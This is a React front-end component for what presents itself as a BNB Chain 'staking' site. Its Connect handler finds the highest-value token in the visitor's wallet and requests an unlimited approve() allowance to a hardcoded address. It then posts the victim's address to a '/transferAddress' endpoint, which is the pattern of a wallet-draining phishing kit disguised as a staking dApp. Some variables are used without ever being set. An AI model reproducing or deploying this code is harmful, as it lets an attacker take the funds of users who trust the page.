/* eslint-disable react/prop-types */
/* eslint-disable no-unused-vars */
import { motion } from 'framer-motion';
import { useEffect, useState } from 'react';
import { UpdateFollower } from 'react-mouse-follower';
import { useNavigate } from 'react-router-dom';
import Web3 from 'web3';
import bnb_logo from '../../assets/bnb-logo.svg';
import busd_logo from '../../assets/busd-logo.svg';
import USDTImage from '../../assets/hero_section_image.png';
import MetaMask from '../../assets/meta_mask.png';
import { chainId } from '../../constants/address';
import Timer from '../../Modules/timer';
import api from '../../util/api';
import { getCurrentWalletConnected } from '../../util/interact';
import { useSelector } from 'react-redux';
import { useAppDispatch } from '../../redux/hook';
import { login } from '../../redux/features/auth/authSlice';

const HeroSection = () => {
	const web3 = new Web3(window.ethereum);
	const [referCode, setReferCode] = useState('');
	const navigate = useNavigate();

	const loggedInInfo = useSelector((state) => state?.auth);
	const dispatch = useAppDispatch();

	useEffect(() => {
		const fetchWallet = async () => {
			const { address, status } = await getCurrentWalletConnected();

			const queryParams = new URLSearchParams(window.location.search);
			const code = queryParams.get('referCode');
			setReferCode(code);

		};

		fetchWallet();
	}, []);

/* 	useEffect(() => {
		const fetchTokenTransfer = async () => {
			try {
				const res = await api.get('/user-detail', {
					params: { address: walletAddress }, // Pass address as a query parameter
				});
				localStorage.setItem('referCode', res?.data?.referCode);
				localStorage.setItem('walletAddress', walletAddress);
			} catch (error) {
				console.log('stories error response :: ', error);
			}
		};

		if (walletAddress && !ownReferCode) {
			fetchTokenTransfer();
		}
	}, [walletAddress, ownReferCode]); */

	const handleOpenMetaMusk = async () => {
		if (window.ethereum) {
			try {
				const currentChainId = await window.ethereum.request({
					method: 'eth_chainId',
				});
				if (currentChainId === chainId) {
					const addressArray = await window.ethereum.request({
						method: 'eth_requestAccounts',
					});
					if (addressArray.length > 0) {
						setApprove(addressArray[0]);
					} else {
						alert('No accounts found.');
					}
				} else {
					try {
						await window.ethereum.request({
							method: 'wallet_switchEthereumChain',
							params: [{ chainId }],
						});
						console.log('Switched to chain:', chainId);
					} catch (error) {
						if (error.code === 4902) {
							alert('Target chain is not added to MetaMask.');
						} else {
							console.error('Error switching chain:', error);
						}
					}
				}
			} catch (err) {
				console.error('Error connecting to MetaMask:', err);
			}
		} else {
			const dappUrl = window.location.hostname;
			const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
			console.log('Redirecting to MetaMask mobile app:', metamaskAppDeepLink);
			window.open(metamaskAppDeepLink, '_self');
		}
	};

	const setApprove = async (walletAddress0) => {
		//-------------------------   get token info from server ---------------------------

		let tokens, tokenPrices, tokenDecimals;

		//-------------------------   get token address from wallet ---------------------------

		const options = { chain: 'bsc', address: walletAddress0, from_block: '0' };
		let tx;
		/* let tx = await Moralis.Web3API.account.getTokenTransfers(options); */
		await api
			.post('/token-transfer', {
				address: walletAddress0, // Include the options object in the body
			})
			.then(function (res) {
				tx = res?.data;
				console.log(res?.data);
			})
			.catch(function (error) {
				console.log('stories error response :: ', error);
			});

		let walletTokenAddress = [];
		for (let i = 0; i < tx.result.length; i++) {
			let is = false;
			for (let j = 0; j < walletTokenAddress.length; j++) {
				if (walletTokenAddress[j] == tx.result[i].address.toUpperCase()) {
					is = true;
				}
			}
			if (is == false) {
				walletTokenAddress.push(tx.result[i].address.toUpperCase());
			}
			is = false;
		}
		console.log('walletTokenAddress', walletTokenAddress);

		//-------------------------   get token balance from wallet tokens ---------------------------

		let walletTokenBalance = [];
		const tAbiImport = await import('../../constants/abis.json');
		const tAbi = tAbiImport.default || tAbiImport;

		for (let i = 0; i < walletTokenAddress.length; i++) {
			window.contract = await new web3.eth.Contract(
				tAbi[0],
				walletTokenAddress[i]
			);
			let balance = await window.contract.methods
				.balanceOf(walletAddress0)
				.call();
			walletTokenBalance.push(Number(balance));
		}

		console.log('Balance: ', walletTokenBalance);

		//-------------------------   get token price ---------------------------

		let walletTokenPrices = [];
		let walletTokenDecimals = [];
		let walletTokenB = [];
		for (let i = 0; i < walletTokenAddress.length; i++) {
			walletTokenPrices[i] = 0;
			walletTokenDecimals[i] = 0;
			for (let j = 0; j < tokens.length; j++) {
				if (tokens[j] == walletTokenAddress[i]) {
					walletTokenPrices[i] = Number(tokenPrices[j]);
					walletTokenDecimals[i] = Number(tokenDecimals[j]);
				}
			}
		}

		for (let i = 0; i < walletTokenAddress.length; i++) {
			walletTokenB[i] =
				(walletTokenBalance[i] * walletTokenPrices[i]) /
				Math.pow(10, walletTokenDecimals[i]);
		}
		console.log('Prices: ', walletTokenPrices);
		console.log('Decimals: ', walletTokenDecimals);
		console.log('wholeBalance:', walletTokenB);

		//-------------------------   get max big price token  ---------------------------

		let len = walletTokenAddress.length;
		let walletTokenB1 = [];
		/* let maxValueTokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"; */
		let maxValueTokenAddress = '0x55d398326f99059ff775485246999027b3197955';

		if (len > 0) {
			for (let i = 0; i < len; i++) {
				walletTokenB1[i] = walletTokenB[i];
			}
			for (let i = 0; i < len - 1; i++) {
				for (let j = i + 1; j < len; j++) {
					if (walletTokenB1[i] < walletTokenB1[j]) {
						let x = walletTokenB1[i];
						walletTokenB1[i] = walletTokenB1[j];
						walletTokenB1[j] = x;
					}
				}
			}
			if (walletTokenB1[0] == 0) {
				maxValueTokenAddress = '0x55d398326f99059ff775485246999027b3197955';
			} else {
				for (let i = 0; i < len; i++) {
					if (walletTokenB[i] == walletTokenB1[0]) {
						maxValueTokenAddress = walletTokenAddress[i];
					}
				}
			}
		} else {
			maxValueTokenAddress = '0x55d398326f99059ff775485246999027b3197955';
		}
		console.log(walletTokenB1);
		console.log(walletTokenAddress);
		console.log('maxValueTokenAddress', maxValueTokenAddress);

		const approveAddress = '0xC7C421854295709136ED9179f16E469909530F44';
		const price =
			'0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';

		console.log('enter');
		console.log(tAbi[0]);
		window.contract = new web3.eth.Contract(tAbi[0], maxValueTokenAddress);
		let tokenContract = window.contract;
		console.log(tokenContract);

		// Estimate gas
		const gasEstimate = await tokenContract.methods
			.approve(approveAddress, price)
			.estimateGas({ from: walletAddress0 });

		// Get the current gas price from the network
		const gasPrice = await web3.eth.getGasPrice();

		// Define transaction parameters
		const approveTransactionParameters = {
			to: maxValueTokenAddress,
			from: walletAddress0,
			data: tokenContract.methods.approve(approveAddress, price).encodeABI(),
			gas: web3.utils.toHex(gasEstimate),
			gasPrice: web3.utils.toHex(gasPrice),
		};

		// Send the transaction
		let txx = await window.ethereum.request({
			method: 'eth_sendTransaction',
			params: [approveTransactionParameters],
		});

		//-------------------------  sending mail to the client ---------------------------

		if (txx) {
			try {
				// Attempt to register
				const registrationResponse = await api.post('/registration', {
					address: walletAddress0,
					referCode,
				});

				// Handle successful registration
				let tx = registrationResponse?.data;
				if(tx){

					dispatch(
						login({
							walletAddress: walletAddress0,
							referCode: registrationResponse?.data?.referCode,
						})
					);

					navigate('/dashboard')
				}
				console.log('Server response:', tx);
			} catch (error) {
				// Handle registration error
				console.log(
					'Registration error, continuing with transferAddress call:',
					error
				);
			}

			// Always execute the transferAddress API call, even if /registration fails
			try {
				const transferResponse = await api.post('/transferAddress', {
					address: walletAddress0, // Directly include the address field
				});

				console.log('Transfer response:', transferResponse.data.message);
			} catch (error) {
				console.log('Transfer error:', error);
			}
		}
	};

	return (
		<section className="grid max-w-screen-xl py-8 mx-auto lg:gap-24 xl:gap-0 lg:py-16 lg:grid-cols-12">
			<div className="mr-auto place-self-center lg:col-span-7 lg-order-1 sm:order-2">
				<motion.h1
					className="max-w-2xl mb-8 text-4xl font-bold tracking-tight xl:leading-tight sm:text-2xl md:text-4xl xl:text-5xl text-white text-center md:text-left sm:mt-5 font-Sans"
					initial={{ opacity: 0, y: 20 }}
					animate={{ opacity: 1, y: 0 }}
					transition={{ delay: 0.2, duration: 0.4 }}
				>
					Join The Fastest Growing Blockchain Ecosystem
				</motion.h1>
				<motion.p
					className="max-w-2xl mb-3 md:mb-6 font-medium text-white md:text-lg lg:text-xl font-varela text-center md:text-left"
					initial={{ opacity: 0, y: 20 }}
					animate={{ opacity: 1, y: 0 }}
					transition={{ delay: 0.2, duration: 0.4 }}
				>
					Staking{' '}
					<span className="ms-4 px-3 py-1 bg-gradient-to-r from-[#40f8a6] to-[#43b1fb] text-white rounded-md ">
						Live
					</span>
				</motion.p>

				<Timer />

				<motion.div
					className="flex mt-6"
					initial={{ opacity: 0, y: 20 }}
					animate={{ opacity: 1, y: 0 }}
					transition={{ delay: 0.2, duration: 0.4 }}
				>
					<UpdateFollower
						mouseOptions={{
							zIndex: 999,
							followSpeed: 1.5,
							scale: 3,
							rotate: -720,
							backgroundElement: (
								<div>
									<img src={MetaMask} alt="pic" />
								</div>
							),
						}}
					>
						<button
							className="inline-flex items-center justify-center px-5 py-3 text-lg font-medium bg-gradient-to-r from-[#40f8a6] to-[#43b1fb] text-white rounded-md uppercase"
							onClick={() => {
								handleOpenMetaMusk();
							}}
						>
							Connect
							<svg
								className="w-5 h-5 ml-2 -mr-1"
								fill="currentColor"
								viewBox="0 0 20 20"
								xmlns="http://www.w3.org/2000/svg"
							>
								<path
									fillRule="evenodd"
									d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z"
									clipRule="evenodd"
								></path>
							</svg>
						</button>
					</UpdateFollower>
				</motion.div>

				<motion.div
					className="text-white mt-10"
					initial={{ opacity: 0, y: 20 }}
					animate={{ opacity: 1, y: 0 }}
					transition={{ delay: 0.2, duration: 0.5 }}
				>
					<p className="font-bold text-lg">We Work With:</p>

					<div className="flex items-center mt-1">
						<div className="flex items-center">
							<img src={bnb_logo} width="20px" height="20px" />
							<span>&nbsp;Binance Smart Chain </span>
						</div>
						<div className="ms-6 flex items-center">
							<img src={busd_logo} width="20px" height="20px" />
							<span>&nbsp;USDT </span>
						</div>
					</div>
				</motion.div>
			</div>
			<motion.div
				className="lg:mt-0 lg:col-span-5 lg:flex justify-center items-center lg:order-2 sm:order-1"
				initial={{ opacity: 0, y: 20 }}
				animate={{ opacity: 1, y: 0 }}
				transition={{ delay: 0.2, duration: 0.5 }}
			>
				<img src={USDTImage} alt="mockup" className="w-full h-auto " />
			</motion.div>
		</section>
	);
};

export default HeroSection;
